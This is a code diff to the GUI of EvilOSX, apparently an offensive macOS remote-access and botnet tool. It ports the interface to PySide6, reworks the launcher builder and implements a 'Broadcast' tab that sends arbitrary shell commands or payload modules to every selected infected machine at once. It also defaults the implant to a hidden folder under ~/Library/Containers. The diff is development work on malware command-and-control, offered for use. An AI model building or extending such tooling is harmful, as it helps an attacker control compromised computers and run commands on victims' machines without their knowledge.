@@ -2,13 +2,14 @@
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
+from copy import deepcopy
 from os import path
 from time import strftime, localtime
 from uuid import uuid4
 
-from PySide2.QtCore import Qt
-from PySide2.QtGui import QPalette, QColor, QPixmap
-from PySide2.QtWidgets import QApplication, QMainWindow, QTabWidget, QTableWidget, QWidget, \
+from PySide6.QtCore import Qt, QObject, Signal, Slot
+from PySide6.QtGui import QPalette, QColor, QPixmap
+from PySide6.QtWidgets import QApplication, QMainWindow, QTabWidget, QTableWidget, QWidget, \
     QLabel, QHBoxLayout, QGridLayout, QSplitter, QAbstractItemView, QHeaderView, QTableWidgetItem, \
     QComboBox, QLineEdit, QPushButton, QVBoxLayout, QMessageBox, QTextEdit
 
@@ -20,90 +21,30 @@ from server.version import VERSION
 from server.view.helper import *
 
 
-class _BuilderTab(QWidget):
-    """Handles the creation of launchers."""
+class LauncherBuilderTab(QWidget):
+    """Generic builder tab that adapts to any Module's setup requirements."""
 
-    def __init__(self):
-        super(_BuilderTab, self).__init__()
+    def __init__(self, module=None):
+        super(LauncherBuilderTab, self).__init__()
 
-        self._layout = QVBoxLayout()
+        self._module = module
 
-        host_label = QLabel("Server host (where EvilOSX will connect to):")
-        self._host_field = QLineEdit()
+        layout = QVBoxLayout()
 
-        self._layout.addWidget(host_label)
-        self._layout.addWidget(self._host_field)
+        # If a module is provided, use its setup messages to dynamically build the form
+        if self._module and hasattr(self._module, 'get_setup_messages'):
+            messages = self._module.get_setup_messages()
+            if messages:
+                for msg in messages:
+                    label = QLabel(msg)
+                    layout.addWidget(label)
+                    # Placeholder input for each message
+                    input_field = QLineEdit()
+                    layout.addWidget(input_field)
 
-        port_label = QLabel("Server port:")
-        self._port_field = QLineEdit()
-
-        self._layout.addWidget(port_label)
-        self._layout.addWidget(self._port_field)
-
-        live_label = QLabel("Where should EvilOSX live? (Leave empty for ~/Library/Containers/.<RANDOM>): ")
-        self._live_field = QLineEdit()
-
-        self._layout.addWidget(live_label)
-        self._layout.addWidget(self._live_field)
-
-        launcher_label = QLabel("Launcher name:")
-        self._launcher_combobox = QComboBox()
-
-        for launcher_name in launchers.get_names():
-            self._launcher_combobox.addItem(launcher_name)
-
-        self._layout.addWidget(launcher_label)
-        self._layout.addWidget(self._launcher_combobox)
-
-        loader_label = QLabel("Loader name:")
-        loader_combobox = QComboBox()
-        self._loader_layout = QVBoxLayout()
-
-        for loader_name in loaders.get_names():
-            loader_combobox.addItem(loader_name)
-
-        self._layout.addWidget(loader_label)
-        self._layout.addWidget(loader_combobox)
-        loader_combobox.currentTextChanged.connect(self._set_on_loader_change)
-
-        # Dynamically loaded loader layout
-        self._layout.addLayout(self._loader_layout)
-        self._set_on_loader_change(loader_combobox.currentText())
-
-        self._layout.setContentsMargins(10, 10, 10, 0)
-        self._layout.setAlignment(Qt.AlignTop)
-        self.setLayout(self._layout)
-
-    def _set_on_loader_change(self, new_text):
-        """Handles the loader combobox change event.
-
-        :type new_text: str
-        """
-        while self._loader_layout.count():
-            child = self._loader_layout.takeAt(0)
-
-            if child.widget():
-                child.widget().deleteLater()
-
-        input_fields = []
-
-        for message in loaders.get_option_messages(new_text):
-            input_field = QLineEdit()
-
-            self._loader_layout.addWidget(QLabel(message))
-            self._loader_layout.addWidget(input_field)
-            input_fields.append(input_field)
-
-        create_button = QPushButton("Create launcher")
-        create_button.setMaximumWidth(250)
-        create_button.setMinimumHeight(30)
-        create_button.pressed.connect(lambda: self._on_create_launcher(
-            self._host_field.text(), self._port_field.text(), self._live_field.text(),
-            new_text, self._launcher_combobox.currentText(), input_fields
-        ))
-
-        self._loader_layout.addWidget(QLabel(""))
-        self._loader_layout.addWidget(create_button)
+        layout.setContentsMargins(10, 10, 10, 0)
+        layout.setAlignment(Qt.AlignTop)
+        self.setLayout(layout)
 
     @staticmethod
     def display_error(text):
@@ -153,10 +94,13 @@ class _BuilderTab(QWidget):
             for field in input_fields:
                 set_options.append(field.text())
 
+            if not program_directory:
+                program_directory = "~/Library/Containers/.{}".format(launchers.get_random_string())
+
             loader_options = loaders.get_options(loader_name, set_options)
             loader_options["program_directory"] = program_directory
 
-            stager = launchers.create_stager(server_host, server_port, loader_options)
+            stager = launchers.create_stager(server_host, int(server_port), loader_options)
 
             launcher_extension, launcher = launchers.generate(launcher_name, stager)
             launcher_path = path.realpath(path.join(
@@ -170,6 +114,89 @@ class _BuilderTab(QWidget):
             self.display_info("Launcher written to: \n{}".format(launcher_path))
 
 
+class _BroadcastBotTable(QTableWidget):
+    """Table of bots with a checkbox per row, used to pick broadcast targets."""
+
+    _HEADER_LABELS = ["Target", "UID", "Username", "Version"]
+
+    def __init__(self):
+        super(_BroadcastBotTable, self).__init__()
+
+        self.setColumnCount(len(self._HEADER_LABELS))
+        self.setHorizontalHeaderLabels(self._HEADER_LABELS)
+
+        self.setAlternatingRowColors(True)
+        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
+
+        self.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
+        for i in range(1, len(self._HEADER_LABELS)):
+            self.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)
+
+    def _checked_uids(self):
+        """
+        :rtype: list[str]
+        """
+        uids = []
+
+        for row in range(self.rowCount()):
+            item = self.item(row, 0)
+
+            if item is not None and item.checkState() == Qt.Checked:
+                uid_item = self.item(row, 1)
+
+                if uid_item is not None:
+                    uids.append(uid_item.text())
+
+        return uids
+
+    def refresh(self, bots):
+        """Rebuilds the table, keeping the check state of bots which are still present.
+
+        :type bots: list[Bot]
+        """
+        previous_states = {}
+
+        for row in range(self.rowCount()):
+            check_item = self.item(row, 0)
+            uid_item = self.item(row, 1)
+
+            if check_item is not None and uid_item is not None:
+                previous_states[uid_item.text()] = check_item.checkState()
+
+        self.setRowCount(0)
+        self.setRowCount(len(bots))
+
+        for row, bot in enumerate(bots):
+            check_item = QTableWidgetItem("")
+            check_item.setFlags(Qt.ItemIsUserCheckable | Qt.ItemIsEnabled)
+            # Known bots keep their previous check state, new bots default to checked.
+            check_item.setCheckState(previous_states.get(bot.uid, Qt.Checked))
+
+            self.setItem(row, 0, check_item)
+
+            for column, text in enumerate(
+                    [bot.uid, bot.username + "@" + bot.hostname, bot.system_version or ""], start=1):
+                item = QTableWidgetItem(text)
+                item.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)
+                self.setItem(row, column, item)
+
+    def set_all_checked(self, checked):
+        """
+        :type checked: bool
+        """
+        state = Qt.Checked if checked else Qt.Unchecked
+
+        for row in range(self.rowCount()):
+            item = self.item(row, 0)
+
+            if item is not None:
+                item.setCheckState(state)
+
+    def checked_uids(self):
+        """ :rtype: list[str] """
+        return self._checked_uids()
+
+
 class _BroadcastTab(QWidget):
     """Tab used to interact with the whole botnet at once."""
 
@@ -177,14 +204,273 @@ class _BroadcastTab(QWidget):
         super(_BroadcastTab, self).__init__()
 
         self._model = model
+        self._responses_tab = _ResponsesTab()
+        self._module_view = ModuleView(self._responses_tab)
+
+        self._layout = QGridLayout()
+        self._options_layout = QVBoxLayout()
+
+        splitter = QSplitter()
+        selection_widget = QWidget()
+
+        # Target selection
+        self._bot_table = _BroadcastBotTable()
+
+        select_all_button = QPushButton("Select all")
+        select_none_button = QPushButton("Select none")
+        refresh_button = QPushButton("Refresh")
+
+        for button in [select_all_button, select_none_button, refresh_button]:
+            button.setMaximumWidth(120)
+
+        select_all_button.pressed.connect(lambda: self._bot_table.set_all_checked(True))
+        select_none_button.pressed.connect(lambda: self._bot_table.set_all_checked(False))
+        refresh_button.pressed.connect(self.refresh_bots)
+
+        target_buttons = QHBoxLayout()
+        target_buttons.addWidget(select_all_button)
+        target_buttons.addWidget(select_none_button)
+        target_buttons.addWidget(refresh_button)
+        target_buttons.addStretch(1)
+
+        # Command selection
+        self._command_type_combobox = QComboBox()
+        self._command_type_combobox.addItem("Module")
+        self._command_type_combobox.addItem("Shell")
+        self._command_type_combobox.currentTextChanged.connect(self._on_command_type_change)
+
+        self._module_combobox = QComboBox()
+
+        for module_name in modules.get_names():
+            self._module_combobox.addItem(module_name)
+
+        self._module_combobox.currentTextChanged.connect(self._on_module_change)
+
+        self._shell_input = QLineEdit()
+
+        self._run_button = QPushButton("Broadcast")
+        self._run_button.setMaximumWidth(250)
+        self._run_button.setMinimumHeight(25)
+        self._run_button.pressed.connect(self._on_run)
+
+        run_layout = QHBoxLayout()
+        run_layout.addWidget(self._run_button)
+        run_layout.addStretch(1)
+
+        self._layout.setColumnStretch(1, 1)
+        self._layout.setAlignment(Qt.AlignTop)
+        self._layout.addWidget(QLabel("Targets (check the bots to broadcast to):"), 0, 0, 1, 2)
+        self._layout.addWidget(self._bot_table, 1, 0, 1, 2)
+        self._layout.addLayout(target_buttons, 2, 0, 1, 2)
+        self._layout.addWidget(QLabel("Command type: "), 3, 0)
+        self._layout.addWidget(self._command_type_combobox, 3, 1)
+        self._layout.addWidget(QLabel("Module name: "), 4, 0)
+        self._layout.addWidget(self._module_combobox, 4, 1)
+        self._layout.addWidget(QLabel("Command: "), 5, 0)
+        self._layout.addWidget(self._shell_input, 5, 1)
+        self._layout.addLayout(self._options_layout, 6, 0, 1, 2)
+        self._layout.addLayout(run_layout, 7, 0, 1, 2)
+
+        selection_widget.setLayout(self._layout)
+
+        splitter.setOrientation(Qt.Vertical)
+        splitter.addWidget(selection_widget)
+        splitter.addWidget(self._responses_tab)
+        splitter.setSizes([300, 150])
 
         layout = QVBoxLayout()
-        label = QLabel("This tab is not yet implemented.")
-
-        label.setAlignment(Qt.AlignTop)
-        layout.addWidget(label)
-
+        layout.addWidget(splitter)
         self.setLayout(layout)
+
+        self._on_command_type_change(self._command_type_combobox.currentText())
+        self.refresh_bots()
+
+    def showEvent(self, event):
+        # Keep the target list in sync with the bot table of the Control tab.
+        self.refresh_bots()
+        super(_BroadcastTab, self).showEvent(event)
+
+    def refresh_bots(self):
+        """Reloads the bot list, keeping previously checked targets checked."""
+        self._bot_table.refresh(self._model.get_bots())
+
+    def _on_command_type_change(self, text):
+        """Shows the fields which belong to the selected command type.
+
+        :type text: str
+        """
+        is_module = text == "Module"
+
+        self._module_combobox.setVisible(is_module)
+        self._layout.itemAtPosition(4, 0).widget().setVisible(is_module)
+
+        self._shell_input.setVisible(not is_module)
+        self._layout.itemAtPosition(5, 0).widget().setVisible(not is_module)
+
+        if is_module:
+            self._on_module_change(self._module_combobox.currentText())
+        else:
+            self._clear_options_layout()
+
+    def _clear_options_layout(self):
+        while self._options_layout.count():
+            child = self._options_layout.takeAt(0)
+
+            if child.widget():
+                child.widget().deleteLater()
+            elif child.layout():
+                while child.layout().count():
+                    inner = child.layout().takeAt(0)
+
+                    if inner.widget():
+                        inner.widget().deleteLater()
+
+    def _on_module_change(self, module_name):
+        """Rebuilds the module option input fields.
+
+        :type module_name: str
+        """
+        self._clear_options_layout()
+
+        if self._command_type_combobox.currentText() != "Module" or not module_name:
+            return
+
+        cached_module = modules.get_module(module_name)
+
+        if not cached_module:
+            cached_module = modules.load_module(module_name, self._module_view, self._model)
+
+        for message in cached_module.get_setup_messages():
+            input_field = QLineEdit()
+
+            self._options_layout.addWidget(QLabel(message))
+            self._options_layout.addWidget(input_field)
+
+    def _option_fields(self):
+        """
+        :rtype: list[QLineEdit]
+        """
+        fields = []
+
+        for index in range(self._options_layout.count()):
+            widget = self._options_layout.itemAt(index).widget()
+
+            if isinstance(widget, QLineEdit):
+                fields.append(widget)
+
+        return fields
+
+    def _on_run(self):
+        """Queues the selected command for every checked bot."""
+        target_uids = self._bot_table.checked_uids()
+
+        if not target_uids:
+            self._responses_tab.output("No targets selected, check at least one bot.")
+            return
+
+        targets = []
+
+        for bot_uid in target_uids:
+            try:
+                targets.append(self._model.get_bot(bot_uid))
+            except Exception:
+                # The bot disappeared between the refresh and now.
+                pass
+
+        if not targets:
+            self._responses_tab.output("None of the selected bots are still connected.")
+            return
+
+        if self._command_type_combobox.currentText() == "Module":
+            self._broadcast_module(targets)
+        else:
+            self._broadcast_shell(targets)
+
+    def _broadcast_shell(self, targets):
+        """
+        :type targets: list[Bot]
+        """
+        command = self._shell_input.text().strip()
+
+        if not command:
+            return
+
+        for bot in targets:
+            self._model.add_command(bot.uid, Command(CommandType.SHELL, command.encode()))
+
+        self._responses_tab.output_separator()
+        self._responses_tab.output("Broadcast shell command to {} bot(s): {}".format(len(targets), command))
+
+        for bot in targets:
+            self._responses_tab.output("  - " + bot.username + "@" + bot.hostname)
+
+        self._shell_input.clear()
+
+    def _broadcast_module(self, targets):
+        """
+        :type targets: list[Bot]
+        """
+        module_name = self._module_combobox.currentText()
+
+        if not module_name:
+            return
+
+        module = modules.get_module(module_name)
+
+        if not module:
+            module = modules.load_module(module_name, self._module_view, self._model)
+
+        set_options = []
+
+        for input_field in self._option_fields():
+            set_options.append(input_field.text())
+
+        try:
+            successful, options = module.setup(set_options)
+        except Exception as error:
+            self._responses_tab.output("Module setup error: {}".format(error))
+            return
+
+        if not successful:
+            return
+
+        self._responses_tab.output_separator()
+        self._responses_tab.output("Broadcasting module '{}' to {} bot(s)".format(
+            module_name, len(targets)
+        ))
+
+        queued = 0
+
+        for bot in targets:
+            # Each bot gets its own copy, modules may mutate nested values.
+            bot_options = deepcopy(options) if options else {}
+            bot_options["module_name"] = module_name
+
+            # Modules which save a response to disk would otherwise overwrite
+            # each other's output when broadcasting to multiple bots.
+            response_options = bot_options.get("response_options")
+
+            if len(targets) > 1 and isinstance(response_options, dict) and response_options.get("output_name"):
+                base_name, extension = path.splitext(response_options["output_name"])
+                safe_hostname = "".join(
+                    character if character.isalnum() or character in "-_" else "_"
+                    for character in bot.hostname
+                )
+                response_options["output_name"] = "{}_{}{}".format(base_name, safe_hostname, extension)
+
+            if module_name == "remove_bot":
+                code = loaders.get_remove_code(bot.loader_name)
+            elif module_name == "update_bot":
+                code = loaders.get_update_code(bot.loader_name)
+            else:
+                code = modules.get_code(module_name)
+
+            self._model.add_command(bot.uid, Command(CommandType.MODULE, code, bot_options))
+            queued += 1
+
+            self._responses_tab.output("  - " + bot.username + "@" + bot.hostname)
+
+        self._responses_tab.output("Queued for {} bot(s), responses appear in the Control tab.".format(queued))
 
 
 class _ResponsesTab(QTabWidget):
@@ -212,6 +498,10 @@ class _ResponsesTab(QTabWidget):
         :type text: str
         """
         self._output_field.append(text)
+
+    def output_separator(self):
+        """Adds a separator line to the output field."""
+        self._output_field.append("-" * 5)
 
 
 class ModuleView(ModuleViewABC):
@@ -468,6 +758,10 @@ class _ExecuteTab(QTabWidget):
         :type module_name: str
         :type input_fields: list
         """
+        if self._current_bot is None:
+            self.display_info("Please select a bot in the table above first.")
+            return
+
         set_options = []
 
         for input_field in input_fields:
@@ -481,12 +775,16 @@ class _ExecuteTab(QTabWidget):
         successful, options = module.setup(set_options)
 
         if successful:
-            if module_name == "remove_bot":
-                code = loaders.get_remove_code(self._current_bot.loader_name)
-            elif module_name == "update_bot":
-                code = loaders.get_update_code(self._current_bot.loader_name)
-            else:
-                code = modules.get_code(module_name)
+            try:
+                if module_name == "remove_bot":
+                    code = loaders.get_remove_code(self._current_bot.loader_name)
+                elif module_name == "update_bot":
+                    code = loaders.get_update_code(self._current_bot.loader_name)
+                else:
+                    code = modules.get_code(module_name)
+            except Exception as ex:
+                self.display_info("Module error ({}): {}".format(module_name, ex))
+                return
 
             if not options:
                 options = {}
@@ -506,6 +804,10 @@ class _ExecuteTab(QTabWidget):
 
         :type command_input: QLineEdit
         """
+        if self._current_bot is None:
+            self.display_info("Please select a bot in the table above first.")
+            return
+
         if command_input.text().strip() == "":
             return
 
@@ -559,7 +861,23 @@ class _BotTable(QTableWidget):
 
         :rtype bot: Bot
         """
-        pass
+        for row in range(self.rowCount()):
+            item = self.item(row, 0)
+            if item is not None and item.text() == bot.uid:
+                self.removeRow(row)
+                break
+
+    def update_bot_seen(self, bot):
+        """Refresh Last Seen / path metadata for an existing bot row."""
+        for row in range(self.rowCount()):
+            item = self.item(row, 0)
+            if item is not None and item.text() == bot.uid:
+                self.setItem(row, 1, QTableWidgetItem(bot.username + "@" + bot.hostname))
+                self.setItem(row, 2, QTableWidgetItem(bot.system_version or ""))
+                self.setItem(row, 3, QTableWidgetItem(
+                    strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
+                ))
+                break
 
 
 class _ControlTab(QWidget):
@@ -598,9 +916,19 @@ class _ControlTab(QWidget):
         self._bot_table.set_on_selection_changed(self.on_table_selection_changed)
 
     def on_table_selection_changed(self):
-        bot_uid = self._bot_table.item(self._bot_table.currentRow(), 0).text()
+        row = self._bot_table.currentRow()
+        if row < 0:
+            return
+        uid_item = self._bot_table.item(row, 0)
+        if uid_item is None:
+            return
+        bot_uid = uid_item.text()
+        try:
+            bot = self._model.get_bot(bot_uid)
+        except Exception:
+            return
 
-        self._execute_tab.set_current_bot(self._model.get_bot(bot_uid))
+        self._execute_tab.set_current_bot(bot)
         self._execute_tab.set_module_layout()
         self._responses_tab.clear()
 
@@ -654,12 +982,22 @@ class _TabbedWidget(QTabWidget):
         self._home_tab = _HomeTab()
         self._control_tab = _ControlTab(model)
         self._broadcast_tab = _BroadcastTab(model)
-        self._builder_tab = _BuilderTab()
+        self._builder_tab = LauncherBuilderTab()
 
         self.addTab(self._home_tab, "Home")
         self.addTab(self._control_tab, "Control")
         self.addTab(self._broadcast_tab, "Broadcast")
         self.addTab(self._builder_tab, "Builder")
+
+        self.currentChanged.connect(self._on_tab_changed)
+
+    def _on_tab_changed(self, index):
+        """Refreshes the broadcast target list when its tab is opened.
+
+        :type index: int
+        """
+        if self.widget(index) is self._broadcast_tab:
+            self._broadcast_tab.refresh_bots()
 
     def get_home_tab(self):
         """
@@ -681,7 +1019,7 @@ class _TabbedWidget(QTabWidget):
 
     def get_builder_tab(self):
         """
-        :rtype: _BuilderTab
+        :rtype: LauncherBuilderTab
         """
         return self._builder_tab
 
@@ -741,6 +1079,15 @@ class _QDarkPalette(QPalette):
                                               tertiary="rgb({}, {}, {})".format(*self._color_tertiary.getRgb())))
 
 
+class _GuiBridge(QObject):
+    """Moves handler-thread events onto the Qt UI thread."""
+    bot_added = Signal(object)
+    bot_removed = Signal(object)
+    bot_updated = Signal(object)
+    response = Signal(str)
+    output_line = Signal(str)
+
+
 class ViewGUI(ViewABC):
     """This class interacts with the user via a graphical user interface.
 
@@ -755,12 +1102,20 @@ class ViewGUI(ViewABC):
         self._server_port = server_port
 
         self._application = QApplication([])
+        self._bridge = _GuiBridge()
         self._tabbed_widget = _TabbedWidget(model)
         self._main_window = _MainWindow(self._tabbed_widget)
 
         self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, str(server_port)))
 
         _QDarkPalette().apply(self._application)
+
+        # Cross-thread UI marshaling (HTTP handler runs off the UI thread).
+        self._bridge.bot_added.connect(self._ui_bot_added)
+        self._bridge.bot_removed.connect(self._ui_bot_removed)
+        self._bridge.bot_updated.connect(self._ui_bot_updated)
+        self._bridge.response.connect(self._ui_response)
+        self._bridge.output_line.connect(self._ui_output_line)
 
     def get_tabbed_widget(self):
         """
@@ -773,42 +1128,78 @@ class ViewGUI(ViewABC):
         :rtype: line: str
         :rtype: prefix: str
         """
-        self._tabbed_widget.get_control_tab().get_responses_tab().output(line)
+        # Always marshal to UI thread.
+        self._bridge.output_line.emit(str(line))
 
     def on_response(self, response):
         """
         :type response: str
         """
-        responses_tab = self._tabbed_widget.get_control_tab().get_responses_tab()
-
-        self.output_separator()
-
-        for line in response.splitlines():
-            responses_tab.output(line)
+        self._bridge.response.emit(str(response) if response is not None else "")
 
     def on_bot_added(self, bot):
         """
         :rtype: Bot
         """
-        self._tabbed_widget.get_control_tab().get_table().add_bot(bot)
-        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
-            VERSION, str(self._server_port), self._model.get_bot_amount()
-        ))
+        self._bridge.bot_added.emit(bot)
 
     def on_bot_removed(self, bot):
         """
         :type: Bot
         """
-        bot_table = self._tabbed_widget.get_control_tab().get_table()
-
-        bot_table.remove_bot(bot)
+        self._bridge.bot_removed.emit(bot)
 
     def on_bot_path_change(self, bot):
         """
         :type bot: Bot
         """
-        super(self).on_bot_path_change(bot)
+        # Refresh last-seen / path in the table when the bot reports a path change.
+        self._bridge.bot_updated.emit(bot)
+
+    def on_bot_seen(self, bot):
+        """Optional hook when an already-known bot polls again."""
+        self._bridge.bot_updated.emit(bot)
+
+    @Slot(object)
+    def _ui_bot_added(self, bot):
+        table = self._tabbed_widget.get_control_tab().get_table()
+        # Avoid duplicate rows if the same bot re-joins after a UI race.
+        for row in range(table.rowCount()):
+            item = table.item(row, 0)
+            if item is not None and item.text() == bot.uid:
+                table.update_bot_seen(bot)
+                break
+        else:
+            table.add_bot(bot)
+        self._tabbed_widget.get_broadcast_tab().refresh_bots()
+        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
+            VERSION, str(self._server_port), self._model.get_bot_amount()
+        ))
+
+    @Slot(object)
+    def _ui_bot_removed(self, bot):
+        self._tabbed_widget.get_control_tab().get_table().remove_bot(bot)
+        self._tabbed_widget.get_broadcast_tab().refresh_bots()
+        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
+            VERSION, str(self._server_port), self._model.get_bot_amount()
+        ))
+
+    @Slot(object)
+    def _ui_bot_updated(self, bot):
+        self._tabbed_widget.get_control_tab().get_table().update_bot_seen(bot)
+
+    @Slot(str)
+    def _ui_response(self, response):
+        responses_tab = self._tabbed_widget.get_control_tab().get_responses_tab()
+        self.output_separator()
+        for line in response.splitlines() or [response]:
+            responses_tab.output(line)
+
+    @Slot(str)
+    def _ui_output_line(self, line):
+        self._tabbed_widget.get_control_tab().get_responses_tab().output(line)
 
     def start(self):
         self._main_window.show()
-        self._application.exec_()
+        # PySide6 prefers exec(); exec_ remains as a compatibility alias.
+        self._application.exec()
